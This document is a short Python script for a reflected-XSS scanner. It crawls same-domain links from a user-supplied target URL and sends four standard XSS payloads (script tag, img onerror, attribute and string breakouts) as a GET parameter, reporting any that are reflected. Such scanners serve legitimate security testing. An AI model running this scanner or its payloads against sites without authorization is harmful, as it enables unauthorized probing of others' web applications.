import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# Set of sample XSS payloads to test
xss_payloads = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '" onmouseover="alert(1)',
    "';alert(1)//"
]

# Function to crawl and collect all URLs from a webpage
def crawl_urls(base_url):
    visited_urls = set()  # To avoid revisiting the same URLs
    urls_to_visit = [base_url]

    discovered_urls = []

    while urls_to_visit:
        url = urls_to_visit.pop(0)
        if url in visited_urls:
            continue

        print(f"Crawling URL: {url}")
        visited_urls.add(url)
        
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find all links on the page
            for link in soup.find_all('a', href=True):
                discovered_url = urljoin(base_url, link['href'])
                
                # Only add new URLs within the same domain
                if base_url in discovered_url and discovered_url not in visited_urls:
                    discovered_urls.append(discovered_url)
                    urls_to_visit.append(discovered_url)

        except Exception as e:
            print(f"Error crawling {url}: {e}")
    
    return discovered_urls

# Function to test each URL for XSS vulnerabilities
def test_xss_on_urls(urls):
    for url in urls:
        # Test with all XSS payloads
        for payload in xss_payloads:
            try:
                # Attempt XSS via GET method
                print(f"Testing {url} with payload: {payload}")
                response = requests.get(url, params={'q': payload})  # Modify parameter based on what the URL accepts

                # Check if the payload is reflected in the response
                if payload in response.text:
                    print(f"[+] XSS vulnerability found on {url}")
                    print(f"Payload: {payload}")
                    print(f"Reflected in response!")
                else:
                    print(f"[-] No XSS found on {url} with this payload.")
            
            except Exception as e:
                print(f"Error testing XSS on {url}: {e}")

# Main function to run the tool
def main():
    base_url = input("Enter the base URL of the target web application: ")
    
    print("[+] Crawling for URLs...")
    urls = crawl_urls(base_url)
    
    print(f"[+] {len(urls)} URLs found. Testing for XSS vulnerabilities...")

    # Test all discovered URLs for XSS vulnerabilities
    test_xss_on_urls(urls)

if __name__ == "__main__":
    main()
